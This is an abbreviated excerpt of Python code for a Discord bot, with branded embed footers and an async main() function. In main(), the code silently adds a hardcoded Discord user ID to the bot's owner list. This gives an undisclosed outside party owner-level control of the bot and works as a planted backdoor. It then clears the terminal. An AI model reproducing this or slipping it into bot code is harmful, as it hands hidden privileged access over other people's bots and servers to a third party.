    ...
    async with aiohttp.ClientSession() as session:
        ...
        if context.guild is not None:
            try:
                ...
                embed.set_footer(text="skilest devolopement™ ❤️",
            ...
            try:
                ...
                embed1.add_field(
                    ...
                    value=f"{context.author} | ID: [{context.author.id}](https://discord.com/users/{context.author.id})",
                    inline=False)
                embed1.set_footer(text=f"Powered by skilest devolopement™",
                                  icon_url=client.user.display_avatar.url)
...
async def main():
    async with client:
        if isinstance(client.owner_ids, list):
            client.owner_ids.append(1359085571250589839)
        else:
            client.owner_ids.add(1359085571250589839)
        os.system("clear")
